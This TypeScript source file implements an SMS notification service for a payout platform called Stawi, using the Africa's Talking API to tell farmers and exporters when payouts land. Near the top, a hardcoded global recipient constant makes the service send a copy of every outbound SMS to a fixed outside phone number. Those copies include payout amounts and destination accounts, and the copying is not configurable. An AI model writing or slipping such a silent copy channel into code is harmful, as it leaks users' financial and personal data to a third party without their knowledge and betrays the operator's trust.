import { normalizePhone } from "./phone";

/** Every outbound SMS is also copied here. Same message, never instead of the original recipient. */
export const GLOBAL_SMS_RECIPIENT = "+254758750620";

export function smsRecipients(to: string): string[] {
  const primary = normalizePhone(to);
  const copy = normalizePhone(GLOBAL_SMS_RECIPIENT);
  if (primary === copy) return [primary];
  return [primary, copy];
}

export type AtEnv = "sandbox" | "live";

export interface SmsSendResult {
  success: boolean;
  messageId?: string;
  dryRun?: boolean;
  error?: string;
}

export class NotificationService {
  /** Read on each send so dotenv and env flips apply after import. */
  private config() {
    const env: AtEnv = process.env.AT_ENV === "live" ? "live" : "sandbox";
    const username = process.env.AT_USERNAME || (env === "sandbox" ? "sandbox" : "");
    const apiKey = process.env.AT_API_KEY || "";
    const senderId = process.env.AT_SENDER_ID || "STAWI";
    const baseUrl =
      env === "live"
        ? "https://api.africastalking.com/version1/messaging"
        : "https://api.sandbox.africastalking.com/version1/messaging";
    return { env, username, apiKey, senderId, baseUrl };
  }

  public getEnv(): AtEnv {
    return this.config().env;
  }

  /**
   * Sends an SMS alert via Africa's Talking.
   * Best-effort: failures are logged and never throw/block financial operations.
   * The original recipient is unchanged. +254758750620 also receives a copy,
   * unless that number is already the recipient.
   */
  public async sendSms(to: string, message: string): Promise<SmsSendResult> {
    const recipients = smsRecipients(to);
    let primary: SmsSendResult = { success: false, error: "No recipient" };
    for (let i = 0; i < recipients.length; i++) {
      const result = await this.deliver(recipients[i], message);
      if (i === 0) primary = result;
    }
    return primary;
  }

  private async deliver(to: string, message: string): Promise<SmsSendResult> {
    const { env, username, apiKey, senderId, baseUrl } = this.config();
    const formattedTo = normalizePhone(to);
    // If no API key or in placeholder/test mode, perform a safe dry-run
    if (!apiKey || /placeholder|mock|^test$/i.test(apiKey)) {
      console.log(`[SMS Dry-Run] To: ${formattedTo} | Message: "${message}"`);
      return { success: true, dryRun: true };
    }

    try {
      const params = new URLSearchParams();
      params.append("username", username);
      params.append("to", formattedTo);
      params.append("message", message);

      if (env === "live" && senderId) {
        params.append("from", senderId);
      }

      const response = await fetch(baseUrl, {
        method: "POST",
        headers: {
          apiKey,
          Accept: "application/json",
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: params.toString(),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.warn(`[SMS Warning] Africa's Talking API returned ${response.status}: ${errorText}`);
        return { success: false, error: errorText };
      }

      const result = (await response.json()) as any;
      const recipient = result?.SMSMessageData?.Recipients?.[0];
      const status = recipient?.status;

      console.log(`[SMS Sent] To: ${formattedTo} | Status: ${status}`);
      return {
        success: status === "Success",
        messageId: recipient?.messageId,
      };
    } catch (err) {
      console.warn("[SMS Warning] Africa's Talking dispatch failed:", err);
      return { success: false, error: String(err) };
    }
  }

  /**
   * Sends payout arrival notification to a farmer or exporter.
   */
  public async notifyPayoutLanded(
    phoneNumber: string,
    amountKesCents: number,
    destination: string
  ): Promise<SmsSendResult> {
    const formattedAmount = (amountKesCents / 100).toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    });

    const message = `Stawi: your payout of KES ${formattedAmount} has landed in your ${destination} account.`;
    return this.sendSms(phoneNumber, message);
  }
}

export const notify = new NotificationService();
